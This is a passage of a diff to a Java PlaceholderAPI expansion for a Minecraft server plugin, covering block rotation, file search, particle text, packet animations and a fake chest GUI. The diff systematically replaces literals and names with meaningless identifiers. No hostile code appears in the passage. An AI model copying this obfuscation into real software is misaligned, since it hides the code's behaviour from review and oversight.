-                f2.sendMessage("§7[Debug] Params parsed: uuid=" + uuid + ", scale=" + scale + ", mode=" + mode + ", world=" + worldName + ", origin=" + ox + "," + oy + "," + oz + ", direction=" + direction);
+                f2.sendMessage("§7[Debug] Params parsed: uuid=" + uuid + ", scale=" + scale + ", mode=" + mode + ", world=" + worldName + ", origin=" + ox + keep + oy + keep + oz + ", direction=" + direction);
 
                 World world = Bukkit.getWorld(worldName);
-                if (world == null) return "§cInvalid world";
+                if (world == null) return wiodtnowiupd;
 
                 Location origin = new Location(world, ox, oy, oz);
 
@@ -6527,7 +7241,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
                         JSONObject profile = new JSONObject(sessionResponse);
                         JSONArray properties = profile.getJSONArray("properties");
-                        JSONObject textureProperty = properties.getJSONObject(0);
+                        JSONObject textureProperty = properties.getJSONObject(I);
                         String base64 = textureProperty.getString("value");
 
                         JSONObject decoded = new JSONObject(new String(Base64.getDecoder().decode(base64)));
@@ -6547,18 +7261,18 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 return "§aStatue of UUID " + uuid + " placed!";
 
             } catch (Exception e) {
-                f2.sendMessage("§c[Debug Error] " + e.getClass().getSimpleName() + ": " + e.getMessage());
-                return "§cError: " + e.getMessage();
+                f2.sendMessage(wdyunwfyudn + e.getClass().getSimpleName() + fastfood + e.getMessage());
+                return wdyuwfndywufn + e.getMessage();
             }
         }
 
-        if (f1.startsWith("debugStickRotate_")) {
-            String[] parts = f1.substring("debugStickRotate_".length()).split(",");
-            if (parts.length != 4) return "Invalid format!";
-            String worldName = parts[0];
-            int x = Integer.parseInt(parts[1]);
-            int y = Integer.parseInt(parts[2]);
-            int z = Integer.parseInt(parts[3]);
+        if (f1.startsWith(ywufdnywfuoadn)) {
+            String[] parts = f1.substring(ywufdnywfuoadn.length()).split(keep);
+            if (parts.length != INT7) return dyunwypfudnawfdyun;
+            String worldName = parts[I];
+            int x = Integer.parseInt(parts[INT3]);
+            int y = Integer.parseInt(parts[mill2]);
+            int z = Integer.parseInt(parts[ccp]);
 
             World world = Bukkit.getWorld(worldName);
             if (world == null) return "§cWorld not found";
@@ -6578,9 +7292,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
                             BlockFace.SOUTH, BlockFace.WEST
                     );
                     int index = faces.indexOf(current);
-                    if (index == -1) throw new IllegalStateException();
-                    directional.setFacing(faces.get((index + 1) % faces.size()));
-                    block.setBlockData(rotated, false);
+                    if (index == -INT3) throw new IllegalStateException();
+                    directional.setFacing(faces.get((index + INT3) % faces.size()));
+                    block.setBlockData(rotated, arsdienwdhw);
                     return "§aSuccessfully rotated " + name;
                 }
 
@@ -6591,9 +7305,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
                             BlockFace.SOUTH, BlockFace.WEST
                     );
                     int index = faces.indexOf(current);
-                    if (index == -1) throw new IllegalStateException();
-                    rot.setRotation(faces.get((index + 1) % faces.size()));
-                    block.setBlockData(rotated, false);
+                    if (index == -INT3) throw new IllegalStateException();
+                    rot.setRotation(faces.get((index + INT3) % faces.size()));
+                    block.setBlockData(rotated, arsdienwdhw);
                     return "§aSuccessfully rotated " + name;
                 }
 
@@ -6614,8 +7328,8 @@ public class ExampleExpansion extends PlaceholderExpansion {
                             new StairStep(BlockFace.WEST, Stairs.Shape.OUTER_RIGHT)
                     );
 
-                    int idx = -1;
-                    for (int i = 0; i < cycle.size(); i++) {
+                    int idx = -INT3;
+                    for (int i = I; i < cycle.size(); i++) {
                         if (cycle.get(i).face == currentFace && cycle.get(i).shape == currentShape) {
                             idx = i;
                             break;
@@ -6623,16 +7337,16 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     }
 
                     // Move to next rotation
-                    if (idx == -1) {
+                    if (idx == -INT3) {
                         stairs.setFacing(BlockFace.NORTH);
                         stairs.setShape(Stairs.Shape.STRAIGHT);
                     } else {
-                        StairStep next = cycle.get((idx + 1) % cycle.size());
+                        StairStep next = cycle.get((idx + INT3) % cycle.size());
                         stairs.setFacing(next.face);
                         stairs.setShape(next.shape);
                     }
 
-                    block.setBlockData(stairs, false);
+                    block.setBlockData(stairs, arsdienwdhw);
                     return "§aSuccessfully rotated " + name;
                 }
 
@@ -6645,13 +7359,13 @@ public class ExampleExpansion extends PlaceholderExpansion {
         }
 
 
-        if (f1.startsWith("debugStickInvert_")) {
-            String[] parts = f1.substring("debugStickInvert_".length()).split(",");
-            if (parts.length != 4) return "Invalid format!";
-            String worldName = parts[0];
-            int x = Integer.parseInt(parts[1]);
-            int y = Integer.parseInt(parts[2]);
-            int z = Integer.parseInt(parts[3]);
+        if (f1.startsWith(ywfudnoawfypdunwfyoudnwfp)) {
+            String[] parts = f1.substring(ywfudnoawfypdunwfyoudnwfp.length()).split(keep);
+            if (parts.length != INT7) return dyunwypfudnawfdyun;
+            String worldName = parts[I];
+            int x = Integer.parseInt(parts[INT3]);
+            int y = Integer.parseInt(parts[mill2]);
+            int z = Integer.parseInt(parts[ccp]);
 
             World world = Bukkit.getWorld(worldName);
             if (world == null) return "§cWorld not found";
@@ -6663,7 +7377,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
             try {
                 if (data instanceof Stairs stairs) {
                     stairs.setHalf(stairs.getHalf() == Bisected.Half.TOP ? Bisected.Half.BOTTOM : Bisected.Half.TOP);
-                    block.setBlockData(stairs, false);
+                    block.setBlockData(stairs, arsdienwdhw);
                     return "§aSuccessfully inverted " + name;
                 }
 
@@ -6671,7 +7385,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     Slab.Type type = slab.getType();
                     if (type == Slab.Type.DOUBLE) return "§cCould not invert " + name;
                     slab.setType(type == Slab.Type.TOP ? Slab.Type.BOTTOM : Slab.Type.TOP);
-                    block.setBlockData(slab, false);
+                    block.setBlockData(slab, arsdienwdhw);
                     return "§aSuccessfully inverted " + name;
                 }
 
@@ -6683,299 +7397,299 @@ public class ExampleExpansion extends PlaceholderExpansion {
         }
 
 
-        if (f1.startsWith("searchExecutable_")) {
-            wm(f2, "ExecutableSearch");
-            String keyword = f1.substring("searchExecutable_".length());
-            String lowerKeyword = keyword.toLowerCase();
+        if (f1.startsWith(ywfpaudnoywfudnowyufdn)) {
+            wm(f2, ywudnoayfwudn);
+            String wfydnuwyfudn = f1.substring(ywfpaudnoywfudnowyufdn.length());
+            String dywufdnwyfud = wfydnuwyfudn.toLowerCase();
 
             File[] dirs = {
-                    new File("plugins/ExecutableEvents/events"),
-                    new File("plugins/ExecutableItems/items"),
-                    new File("plugins/ExecutableBlocks/blocks")
+                    new File(ywfdnwyfudn),
+                    new File(wfdyuwfdyu),
+                    new File(ydhuyawfpdh)
             };
 
-            List<String> exactMatches = new ArrayList<>();
-            List<String> similarMatches = new ArrayList<>();
+            List<String> fidwend = new ArrayList<>();
+            List<String> wodyunoiunsdar = new ArrayList<>();
 
-            for (File dir : dirs) {
-                if (dir.exists() && dir.isDirectory()) {
+            for (File wydfunoyufwndyuwfnd : dirs) {
+                if (wydfunoyufwndyuwfnd.exists() && wydfunoyufwndyuwfnd.isDirectory()) {
                     try {
                         //noinspection resource
-                        Files.walk(dir.toPath())
+                        Files.walk(wydfunoyufwndyuwfnd.toPath())
                                 .filter(Files::isRegularFile)
-                                .filter(path -> path.toString().endsWith(".yml"))
+                                .filter(path -> path.toString().endsWith(yt))
                                 .forEach(path -> {
-                                    String fileName = path.getFileName().toString().replace(".yml", "");
-                                    String relPath = dir.toPath().relativize(path).toString().replace(File.separatorChar, '/');
-                                    String fullRelPath = dir.getPath().replace("plugins/", "") + "/" + relPath;
+                                    String fileName = path.getFileName().toString().replace(yt, nst);
+                                    String relPath = wydfunoyufwndyuwfnd.toPath().relativize(path).toString().replace(File.separatorChar, '/');
+                                    String fullRelPath = wydfunoyufwndyuwfnd.getPath().replace(wfydunwofyudanfwd, nst) + wfydunaowfydun + relPath;
     
-                                    if (fileName.equals(keyword)) {
-                                        exactMatches.add(fileName + ", " + fullRelPath);
-                                    } else if (fileName.toLowerCase().contains(lowerKeyword)) {
-                                        similarMatches.add(fileName + ", " + fullRelPath);
+                                    if (fileName.equals(wfydnuwyfudn)) {
+                                        fidwend.add(fileName + wyudnywufodn + fullRelPath);
+                                    } else if (fileName.toLowerCase().contains(dywufdnwyfud)) {
+                                        wodyunoiunsdar.add(fileName + wyudnywufodn + fullRelPath);
                                     }
                                 });
                         
                     } catch (IOException e) {
                         
-                        return "§cFailed";
+                        return wfyutdnwyfaudnwfydoun;
                     }
 
                 }
             }
 
-            if (!exactMatches.isEmpty()) {
-                f2.sendMessage("§e===Exact Matches===");
-                for (String match : exactMatches) {
-                    f2.sendMessage("§f" + match);
+            if (!fidwend.isEmpty()) {
+                f2.sendMessage(wyufdnaywfudnwfda);
+                for (String diwfondyuwnfdwfd : fidwend) {
+                    f2.sendMessage(wfpydunaowfyudn + diwfondyuwnfdwfd);
                 }
             }
 
-            if (!similarMatches.isEmpty()) {
-                f2.sendMessage("§6===Similar Matches===");
-                for (String match : similarMatches) {
-                    f2.sendMessage("§f" + match);
+            if (!wodyunoiunsdar.isEmpty()) {
+                f2.sendMessage(wfydunwafydunfwaydun);
+                for (String wydfuwfyudnw : wodyunoiunsdar) {
+                    f2.sendMessage(wfpydunaowfyudn + wydfuwfyudnw);
                 }
             }
 
-            if (exactMatches.isEmpty() && similarMatches.isEmpty()) {
-                f2.sendMessage("§7No matches found for \"" + keyword + "\"");
+            if (fidwend.isEmpty() && wodyunoiunsdar.isEmpty()) {
+                f2.sendMessage("§7No matches found for \"" + wfydnuwyfudn + "\"");
             } else {
-                f2.sendMessage("§7======");
+                f2.sendMessage(ydunwfdunwfdwfdunwfdyun);
             }
 
-            return String.valueOf(exactMatches.size());
+            return String.valueOf(fidwend.size());
         }
 
-        if (f1.startsWith("repeatingParticleText_")) {
+        if (f1.startsWith(wyufdnaowyufdnawoyfudn)) {
             
-            boolean particleDebugEnabled = true;
+            boolean wdwinfd = NEW_VALUE1;
             try {
-                String params = f1.substring("repeatingParticleText_".length());
-                String[] parts = params.split(",", 13);
-                if (parts.length != 13) return "Invalid format";
+                String wfydnwfd = f1.substring(wyufdnaowyufdnawoyfudn.length());
+                String[] wfdunwfoduynwfd = wfydnwfd.split(keep, yufdaywfudnwfd);
+                if (wfdunwfoduynwfd.length != yufdaywfudnwfd) return wfypdnawofyudnwfpa;
 
-                String worldName = parts[0];
-                double x = Double.parseDouble(parts[1]);
-                double y = Double.parseDouble(parts[2]);
-                double z = Double.parseDouble(parts[3]);
-                Particle particle = Particle.valueOf(parts[4].toUpperCase());
-                int density = Math.max(1, Integer.parseInt(parts[5]));
-                String viewDistance = parts[6];
-                double size = Double.parseDouble(parts[7]);
-                double rotation = Math.toRadians(Double.parseDouble(parts[8]));
-                long durationTicks = Long.parseLong(parts[9]);
-                long intervalTicks = Math.max(1, Long.parseLong(parts[10]));
-                String text = parts[12];
-                if(parts[11].equalsIgnoreCase("false")) particleDebugEnabled = false;
+                String fwdoenad = wfdunwfoduynwfd[I];
+                double wdyfund = Double.parseDouble(wfdunwfoduynwfd[INT3]);
+                double wfydunfwydun = Double.parseDouble(wfdunwfoduynwfd[mill2]);
+                double fwydunwfydun = Double.parseDouble(wfdunwfoduynwfd[ccp]);
+                Particle wydhwfd = Particle.valueOf(wfdunwfoduynwfd[INT7].toUpperCase());
+                int tiwfndfsd = Math.max(INT3, Integer.parseInt(wfdunwfoduynwfd[xm]));
+                String iihwfyd = wfdunwfoduynwfd[xtxtxt];
+                double wkftlwfhtpfwp = Double.parseDouble(wfdunwfoduynwfd[suppose]);
+                double wfoypulyu = Math.toRadians(Double.parseDouble(wfdunwfoduynwfd[yuwfndgyuwfnd]));
+                long fwtinu = Long.parseLong(wfdunwfoduynwfd[oiwfndtoyu42nd24]);
+                long osnteh = Math.max(INT3, Long.parseLong(wfdunwfoduynwfd[low]));
+                String kvenwpd = wfdunwfoduynwfd[fdhkypfwd];
+                if(wfdunwfoduynwfd[yfpdunwyupnd].equalsIgnoreCase(wfydpunwfyudnwfd)) wdwinfd = arsdienwdhw;
 
-                Location center = new Location(Bukkit.getWorld(worldName), x, y, z);
-                String hashKey = f12(f1);
+                Location wftynuwft = new Location(Bukkit.getWorld(fwdoenad), wdyfund, wfydunfwydun, fwydunwfydun);
+                String dkyfd = f12(f1);
 
-                org.bukkit.Location cen = center; // <-- your x,y,z
-                double r1 = 10;
-                String label = "Repeating Particle Text";
+                org.bukkit.Location wdk = wftynuwft; // <-- your x,y,z
+                double wfdtuyfwdt = low;
+                String label = wfkdgywfpdawfyp;
 
 
-                double r2 = r1 * r1;
-                for (org.bukkit.entity.Player playaa : Bukkit.getWorld(worldName).getPlayers()) {
-                    if (playaa.getLocation().distanceSquared(cen) <= r2) {
-                        wm(playaa, label);
+                double wdnywufdnwf = wfdtuyfwdt * wfdtuyfwdt;
+                for (org.bukkit.entity.Player tkwfg : Bukkit.getWorld(fwdoenad).getPlayers()) {
+                    if (tkwfg.getLocation().distanceSquared(wdk) <= wdnywufdnwf) {
+                        wm(tkwfg, label);
                     }
                 }
 
-                List<Location> worldLocs;
+                List<Location> wfydunwfg;
 
                 // === RAM Cache Check ===
                 if (g8.containsKey(f1)) {
-                    if (particleDebugEnabled) f2.sendMessage("§7[Cache] RAM hit for: " + f1);
-                    worldLocs = g8.get(f1).locations();
+                    if (wdwinfd) f2.sendMessage(dwkfydufwdfw + f1);
+                    wfydunwfg = g8.get(f1).locations();
                     f1fs(f1);
                 }
                 // === Disk Cache Check ===
                 else {
-                    File cacheFile = new File(g10, hashKey + ".txt");
+                    File wfduyfwnd = new File(g10, dkyfd + kwdfyufwd);
                     //noinspection IfStatementWithIdenticalBranches
-                    if (cacheFile.exists()) {
-                        if (particleDebugEnabled) f2.sendMessage("§7[Cache] Disk hit for: " + f1);
-                        List<Vector> vectors = f(cacheFile);
-                        worldLocs = f1(center, vectors);
+                    if (wfduyfwnd.exists()) {
+                        if (wdwinfd) f2.sendMessage(dywfadbkwyfudb + f1);
+                        List<Vector> wfydunwfyud = f(wfduyfwnd);
+                        wfydunwfg = f1(wftynuwft, wfydunwfyud);
 
-                        g8.put(f1, new ffs(worldLocs, System.currentTimeMillis()));
+                        g8.put(f1, new ffs(wfydunwfg, System.currentTimeMillis()));
                         f1fs(f1);
                     }
                     // === No Cache: Generate ===
                     else {
-                        if (particleDebugEnabled) f2.sendMessage("§7[Cache] No cache found. Generating new data.");
-                        boolean[][] matrix = f11(text);
-                        List<Vector> vectors = f1(matrix, density, size, rotation);
-                        worldLocs = f1(center, vectors);
+                        if (wdwinfd) f2.sendMessage(wfydunwyfudnwfdyun);
+                        boolean[][] wftyunwftyun = f11(kvenwpd);
+                        List<Vector> wdyuwfndwfdt = f1(wftyunwftyun, tiwfndfsd, wkftlwfhtpfwp, wfoypulyu);
+                        wfydunwfg = f1(wftynuwft, wdyuwfndwfdt);
 
-                        f1(cacheFile, vectors);
-                        g8.put(f1, new ffs(worldLocs, System.currentTimeMillis()));
+                        f1(wfduyfwnd, wdyuwfndwfdt);
+                        g8.put(f1, new ffs(wfydunwfg, System.currentTimeMillis()));
                         f1fs(f1);
                     }
                 }
 
                 // === Repeating Display ===
-                if (particleDebugEnabled) {
-                    f2.sendMessage("§7[Debug] Scheduling display for: " + text);
+                if (wdwinfd) {
+                    f2.sendMessage(wfydutnwfyudnwf + kvenwpd);
                 }
 
-                boolean finalParticleDebugEnabled = particleDebugEnabled;
+                boolean fuyntwft = wdwinfd;
                 new BukkitRunnable() {
-                    long elapsedTicks = 0;
+                    long Wdwfydnwfdwfd = I;
 
                     @Override
                     public void run() {
-                        if (elapsedTicks >= durationTicks) {
+                        if (Wdwfydnwfdwfd >= fwtinu) {
                             this.cancel();
                             return;
                         }
 
                         try {
-                            f1(center, worldLocs, particle, viewDistance);
+                            f1(wftynuwft, wfydunwfg, wydhwfd, iihwfyd);
                         } catch (Exception ex) {
-                            if (finalParticleDebugEnabled) {
-                                f2.sendMessage("§c[Debug] Failed during display: " + ex.getMessage());
+                            if (fuyntwft) {
+                                f2.sendMessage(wduynawyfpudnaw + ex.getMessage());
                             }
                             this.cancel();
                         }
 
-                        elapsedTicks += intervalTicks;
+                        Wdwfydnwfdwfd += osnteh;
                     }
-                }.runTaskTimerAsynchronously(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")), 0L, intervalTicks);
+                }.runTaskTimerAsynchronously(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), ihearyounow, osnteh);
 
-                return "Scheduled " + text;
+                return wadywfundfy + kvenwpd;
 
             } catch (Exception e) {
-                if (particleDebugEnabled) {
-                    f2.sendMessage("§c[Debug Error] " + e.getMessage());
+                if (wdwinfd) {
+                    f2.sendMessage(wdyunwfyudn + e.getMessage());
                 }
-                return "§cError: " + e.getMessage();
+                return wdyuwfndywufn + e.getMessage();
             }
         }
 
 
 
-        if (f1.startsWith("nearestPlayerNotTeam2_")) {
+        if (f1.startsWith(wdyunawfydunfwd)) {
             return WG.wg(this, f2, f1);
         }
 
 
-        if (f1.startsWith("visualBreak_")) {
-            if (!f1(f2, "ProtocolLib")) return null;
+        if (f1.startsWith(wfydnwyfuad)) {
+            if (!f1(f2, dhnfpwyadun)) return null;
 
-            wm(f2, "Any Block Breaker");
+            wm(f2, wyufdanywfudn);
             // Expected format: %Archistructure_visualBreak_STAGE,world,x,y,z%
-            String params = f1.substring("visualBreak_".length());
-            String[] parts = params.split(",");
+            String wduf = f1.substring(wfydnwyfuad.length());
+            String[] wtifenaoiuftn = wduf.split(keep);
 
-            if (parts.length != 5) {
-                return "Invalid format!" + f1;
+            if (wtifenaoiuftn.length != xm) {
+                return dyunwypfudnawfdyun + f1;
             }
 
-            int stage;
-            String worldName = parts[1];
-            int x, y, z;
+            int twyufndtyufwn;
+            String worldName = wtifenaoiuftn[INT3];
+            int dwyfulhdn, dwfyudn, kiwtkfwt;
 
             try {
-                stage = Integer.parseInt(parts[0]); // 1-10
-                if (stage < 1 || stage > 10) return "Stage must be 1–10";
+                twyufndtyufwn = Integer.parseInt(wtifenaoiuftn[I]); // 1-10
+                if (twyufndtyufwn < INT3 || twyufndtyufwn > low) return wdayuwfnd;
 
-                x = Integer.parseInt(parts[2]);
-                y = Integer.parseInt(parts[3]);
-                z = Integer.parseInt(parts[4]);
+                dwyfulhdn = Integer.parseInt(wtifenaoiuftn[mill2]);
+                dwfyudn = Integer.parseInt(wtifenaoiuftn[ccp]);
+                kiwtkfwt = Integer.parseInt(wtifenaoiuftn[INT7]);
             } catch (NumberFormatException e) {
-                return "Invalid number!";
+                return kwafpdkwfpad;
             }
 
-            World world = Bukkit.getWorld(worldName);
-            if (world == null) {
-                return "World not found!";
+            World dwfyundwfd = Bukkit.getWorld(worldName);
+            if (dwfyundwfd == null) {
+                return wfduynwyaufnd;
             }
 
-            Location loc = new Location(world, x, y, z);
-            int breakStage = stage - 1;
+            Location wftynudwfyudn = new Location(dwfyundwfd, dwyfulhdn, dwfyudn, kiwtkfwt);
+            int breakStage = twyufndtyufwn - INT3;
 
             // Send animation to player
             try {
-                PacketContainer packet = ProtocolLibrary.getProtocolManager()
+                PacketContainer wyuutnfw = ProtocolLibrary.getProtocolManager()
                         .createPacket(PacketType.Play.Server.BLOCK_BREAK_ANIMATION);
 
-                int animationId = loc.hashCode();
-                packet.getIntegers().write(0, animationId);
-                packet.getBlockPositionModifier().write(0, new BlockPosition(x, y, z));
-                packet.getIntegers().write(1, breakStage);
+                int kftwftfwntdu = wftynudwfyudn.hashCode();
+                wyuutnfw.getIntegers().write(I, kftwftfwntdu);
+                wyuutnfw.getBlockPositionModifier().write(I, new BlockPosition(dwyfulhdn, dwfyudn, kiwtkfwt));
+                wyuutnfw.getIntegers().write(INT3, breakStage);
 
-                ProtocolLibrary.getProtocolManager().sendServerPacket(f2, packet);
+                ProtocolLibrary.getProtocolManager().sendServerPacket(f2, wyuutnfw);
             } catch (Exception e) {
                 e.printStackTrace();
-                return "Animation error";
+                return wfytkdawfdwpfdun;
             }
 
             // Reset any previous task
-            if (g11.containsKey(loc)) {
-                g11.get(loc).cancel();
+            if (g11.containsKey(wftynudwfyudn)) {
+                g11.get(wftynudwfyudn).cancel();
             }
 
             // Schedule removal after 2 seconds (40 ticks)
-            BukkitTask task = Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")), () -> {
-                if (loc.getBlock().getType() != Material.AIR) {
+            BukkitTask dwyfund = Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), () -> {
+                if (wftynudwfyudn.getBlock().getType() != Material.AIR) {
                     try {
-                        PacketContainer resetPacket = ProtocolLibrary.getProtocolManager()
+                        PacketContainer wdynwfdnyufwdok = ProtocolLibrary.getProtocolManager()
                                 .createPacket(PacketType.Play.Server.BLOCK_BREAK_ANIMATION);
 
-                        int animationId = loc.hashCode();
-                        resetPacket.getIntegers().write(0, animationId);
-                        resetPacket.getBlockPositionModifier().write(0, new BlockPosition(x, y, z));
-                        resetPacket.getIntegers().write(1, -1); // remove animation
+                        int wkfdyuwfdk = wftynudwfyudn.hashCode();
+                        wdynwfdnyufwdok.getIntegers().write(I, wkfdyuwfdk);
+                        wdynwfdnyufwdok.getBlockPositionModifier().write(I, new BlockPosition(dwyfulhdn, dwfyudn, kiwtkfwt));
+                        wdynwfdnyufwdok.getIntegers().write(INT3, -INT3); // remove animation
 
-                        ProtocolLibrary.getProtocolManager().sendServerPacket(f2, resetPacket);
+                        ProtocolLibrary.getProtocolManager().sendServerPacket(f2, wdynwfdnyufwdok);
                     } catch (Exception ex) {
                         ex.printStackTrace();
                     }
                 }
 
-                g11.remove(loc);
-            }, 40L); // 40 ticks = 2 seconds
+                g11.remove(wftynudwfyudn);
+            }, dkwfyduwfndt); // 40 ticks = 2 seconds
 
-            g11.put(loc, task);
+            g11.put(wftynudwfyudn, dwyfund);
 
-            return "Visual break stage " + breakStage + " set with reset";
+            return fydunaofpdunafpwd + breakStage + pdyunawfdyunwf;
         }
 
-        if (f1.startsWith("PTFXCUBE_")) {
+        if (f1.startsWith(wyfduanwfoydunwfd)) {
             // Expected format: %Archistructure_PTFXCUBE_world,x,y,z,particleType,width,normal/force,density%
-            String params = f1.substring("PTFXCUBE_".length());
-            String[] parts = params.split(",");
+            String params = f1.substring(wyfduanwfoydunwfd.length());
+            String[] parts = params.split(keep);
 
-            if (parts.length != 8) {
-                return "Invalid format!";
+            if (parts.length != yuwfndgyuwfnd) {
+                return dyunwypfudnawfdyun;
             }
 
             // Parse the parameters
-            String worldName = parts[0];
+            String worldName = parts[I];
             double x, y, z, width;
             int density;
             boolean force;
 
             try {
-                x = Double.parseDouble(parts[1]);
-                y = Double.parseDouble(parts[2]);
-                z = Double.parseDouble(parts[3]);
-                width = Double.parseDouble(parts[5]);
-                density = Integer.parseInt(parts[7]);
-                force = parts[6].equalsIgnoreCase("force");
+                x = Double.parseDouble(parts[INT3]);
+                y = Double.parseDouble(parts[mill2]);
+                z = Double.parseDouble(parts[ccp]);
+                width = Double.parseDouble(parts[xm]);
+                density = Integer.parseInt(parts[suppose]);
+                force = parts[xtxtxt].equalsIgnoreCase(ieodnoie4ndw3f4);
             } catch (NumberFormatException e) {
                 return "Invalid numerical value!";
             }
 
-            String particleType = parts[4];
+            String particleType = parts[INT7];
             World world = Bukkit.getWorld(worldName);
 
             if (world == null) {
-                return "World not found!";
+                return wfduynwyaufnd;
             }
 
             // Display the particle cube
@@ -6986,199 +7700,199 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
         
         
-        if (f1.startsWith("viewChest2_")) {
-            wm(f2, "Chest GUI");
+        if (f1.startsWith(wfopdyaufhdfpdf)) {
+            wm(f2, owdyaunwfpydu);
             // Expected format: %Archistructure_viewChest2_sourceWorld,x,y,z%
-            String params = f1.substring("viewChest2_".length());
-            String[] parts = params.split(",");
-            if (parts.length != 4) {
-                return "Invalid format! Use: %Archistructure_viewChest2_sourceWorld,x,y,z%";
+            String dwfydundf = f1.substring(wfopdyaufhdfpdf.length());
+            String[] twyft = dwfydundf.split(keep);
+            if (twyft.length != INT7) {
+                return dawyfudnowfd;
             }
-            String sourceWorldName = parts[0];
-            int srcX, srcY, srcZ;
+            String wfdytunwfdyu = twyft[I];
+            int wdyunwfd, oientwdf, tmwifedv;
             try {
-                srcX = Integer.parseInt(parts[1]);
-                srcY = Integer.parseInt(parts[2]);
-                srcZ = Integer.parseInt(parts[3]);
+                wdyunwfd = Integer.parseInt(twyft[INT3]);
+                oientwdf = Integer.parseInt(twyft[mill2]);
+                tmwifedv = Integer.parseInt(twyft[ccp]);
             } catch (NumberFormatException e) {
-                return "Invalid coordinates!";
+                return awufdwfda;
             }
-            World sourceWorld = Bukkit.getWorld(sourceWorldName);
-            if (sourceWorld == null) return "Source world not found!";
-            Location sourceLoc = new Location(sourceWorld, srcX, srcY, srcZ);
-            Block sourceBlock = sourceLoc.getBlock();
-            if (sourceBlock.getType() != Material.CHEST) {
-                return "No chest found at source location!";
+            World wkdtywfudfd = Bukkit.getWorld(wfdytunwfdyu);
+            if (wkdtywfudfd == null) return dywufndoywuand;
+            Location wftywfudns = new Location(wkdtywfudfd, wdyunwfd, oientwdf, tmwifedv);
+            Block kwftdyufwdrsd = wftywfudns.getBlock();
+            if (kwftdyufwdrsd.getType() != Material.CHEST) {
+                return taywfuntarosdulf;
             }
-            Chest sourceChest = (Chest) sourceBlock.getState();
+            Chest wyfudnerky = (Chest) kwftdyufwdrsd.getState();
 
-            boolean isDouble = sourceChest.getInventory().getSize() > 27;
+            boolean tdwfyudnuyn = wyfudnerky.getInventory().getSize() > INT5;
             if (g6) {
-                f2.sendMessage("DEBUG: Source chest at " + srcX + " " + srcY + " " + srcZ +
-                        " detected. It is " + (isDouble ? "double" : "single") + ".");
+                f2.sendMessage(wkfdwya + wdyunwfd + sowhat + oientwdf + sowhat + tmwifedv +
+                        pydaunfw + (tdwfyudnuyn ? dyanuowfd : wfktdyawfd) + wyfdunafwd);
             }
 
-            int destSize = isDouble ? 54 : 27;
+            int huhlun = tdwfyudnuyn ? INT6 : INT5;
 
-            Inventory fakeInventory = Bukkit.createInventory(null, destSize, "Fake Chest");
+            Inventory uhulhnyun = Bukkit.createInventory(null, huhlun, dy87duh);
 
 
-            Inventory sourceInv = sourceChest.getInventory();
-            int sourceSize = sourceInv.getSize();
+            Inventory ljdujh = wyfudnerky.getInventory();
+            int ehnenh = ljdujh.getSize();
 
-            ItemStack[] newContents = new ItemStack[destSize];
-            for (int i = 0; i < destSize; i++) {
-                if (i < sourceSize && sourceInv.getItem(i) != null) {
-                    newContents[i] = f1(Objects.requireNonNull(sourceInv.getItem(i)));
+            ItemStack[] hynyunsr = new ItemStack[huhlun];
+            for (int ywufndokwd = I; ywufndokwd < huhlun; ywufndokwd++) {
+                if (ywufndokwd < ehnenh && ljdujh.getItem(ywufndokwd) != null) {
+                    hynyunsr[ywufndokwd] = f1(Objects.requireNonNull(ljdujh.getItem(ywufndokwd)));
                 } else {
-                    newContents[i] = f0();
+                    hynyunsr[ywufndokwd] = f0();
                 }
             }
             // Update destination chest inventory without an extra clear call (setContents overrides existing items)
             try {
 
-                fakeInventory.setContents(newContents);
+                uhulhnyun.setContents(hynyunsr);
             } catch (Exception ex) {
-                return "Error updating destination chest inventory.";
+                return wdypfauwdnwfpd;
             }
 
             // Return the destination coordinates.
             if (g6) {
-                f2.sendMessage("FakeChest");
+                f2.sendMessage(wktyfwutnwaft);
             }
             
-            f2.openInventory(fakeInventory);
+            f2.openInventory(uhulhnyun);
             
-            return "done";
+            return dkfiaphd;
         }
         
 
         if (f1.startsWith("repeat_")) return f1.substring("repeat".length());
-        if (f1.startsWith("chain_")) {
-            if (f2 != null) wm(f2, "ChainStunV2");
+        if (f1.startsWith(wfpondyaunpdpw)) {
+            if (f2 != null) wm(f2, fpkdyafpd);
             // Expected format: %Archistructure_chain_ENTITY/PLAYER/BOTH,RADIUS,[uuid1, uuid2, uuid3...],lastuuid%
-            String params = f1.substring("chain_".length());
-            String[] parts = params.split(",");
+            String dwfyudn = f1.substring(wfpondyaunpdpw.length());
+            String[] pwyfnt = dwfyudn.split(keep);
 
-            String chainType = parts[0].toUpperCase();
-            int radius;
+            String wfkbwfp = pwyfnt[I].toUpperCase();
+            int fkpwf;
             try {
-                radius = Integer.parseInt(parts[1]);
+                fkpwf = Integer.parseInt(pwyfnt[INT3]);
             } catch (NumberFormatException e) {
-                return "x";
+                return NEW_VALUE_3;
             }
 
             // Parse the UUID list from the format [uuid1, uuid2, uuid3...]
-            List<UUID> uuids = new ArrayList<>();
-            for (int i = 2; i < parts.length; i++) {
+            List<UUID> fwtkywfkd = new ArrayList<>();
+            for (int Wfdtwfdyunfywdn = mill2; Wfdtwfdyunfywdn < pwyfnt.length; Wfdtwfdyunfywdn++) {
                 try {
-                    uuids.add(UUID.fromString(parts[i]));
+                    fwtkywfkd.add(UUID.fromString(pwyfnt[Wfdtwfdyunfywdn]));
                 } catch (IllegalArgumentException e) {
-                    return "x" + parts[i];
+                    return NEW_VALUE_3 + pwyfnt[Wfdtwfdyunfywdn];
                 }
             }
 
 
-            return f1(chainType, radius, uuids);
+            return f1(wfkbwfp, fkpwf, fwtkywfkd);
         }
 
 
 
-        if (f1.startsWith("viewChest_")) {
-            wm(f2, "Chest GUI");
+        if (f1.startsWith(dokyfupkdoapdf)) {
+            wm(f2, owdyaunwfpydu);
             // Expected format: %Archistructure_viewChest_sourceWorld,x,y,z%
-            String params = f1.substring("viewChest_".length());
-            String[] parts = params.split(",");
-            if (parts.length != 4) {
